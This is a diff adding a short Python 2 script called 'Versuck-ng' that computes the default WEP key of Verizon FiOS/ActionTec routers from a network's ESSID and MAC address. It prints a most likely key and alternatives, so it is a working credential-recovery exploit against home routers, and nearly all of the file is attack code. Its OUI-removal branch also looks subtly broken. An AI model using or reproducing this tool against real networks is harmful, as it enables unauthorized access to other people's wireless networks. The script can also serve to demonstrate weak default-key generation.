@@ -1,0 +1,65 @@
+#!/usr/bin/env python
+__author__ 	= "TheX1le"
+__version__ = "10-15-2009.231841"
+
+"""
+Verizon Fios and actiontech in their wisdom decided that
+it would be a good idea to generate your 64 bit WEP
+key off the internal mac address of your router and
+some basic base 36 math. Sounds like a fine idea to me!
+"""
+
+import optparse, sys
+def createKey(essid,bssid):
+	actionOUI = ['0020E0', 
+		'000FB3', 
+		'001801', 
+		'001F90', 
+		'0026B8', 
+		'00247B', 
+		'002662', 
+		'001505', 
+		'001EA7']
+	returndict = {}
+	output = 0 #key decimal value
+	multiplier = 1 #up by 36 each time
+	#remove formating of bssid
+	bssid = bssid.replace(":","").replace("-","")
+	for char in essid.upper():
+		output += int(char,36)*multiplier
+		multiplier = multiplier * 36
+	key = "%X" % output #convert dec to hex
+	
+	returndict["best"] = bssid[2:6]+key 
+	if bssid[2:6] in actionOUI:
+		actionOUI.pop(bssid[2:6])
+	counter = 1
+	for oui in actionOUI: 
+		returndict["alt"+str(counter)] = oui[2:6]+key
+		counter += 1
+	return returndict
+	#return the key postions 34 and 56 of the bssid 
+	#are appended to the calulated key
+
+def banner():
+	print "\n"+"#"*16
+	print "#"+" "*2+"Versuck-ng"+" "*2+"#"
+	print "#"*16
+
+if __name__ == "__main__":
+	parser = optparse.OptionParser("usage: %prog options -m -e")
+	parser.add_option("-m", "--mac", dest="mac",nargs=1, help="Mac Address")
+	parser.add_option("-e", "--essid", dest="essid",nargs=1, help="essid")
+
+	if len(sys.argv) <= 1:
+		banner()
+		parser.print_help()
+		sys.exit(0)
+	(options, args) = parser.parse_args()
+	data = createKey(options.essid,options.mac)
+	print "Key is most likely"
+	print data["best"]
+	print "Key May also be one of these"
+	for key in data.keys():
+		if key is not "best":
+			print data[key]
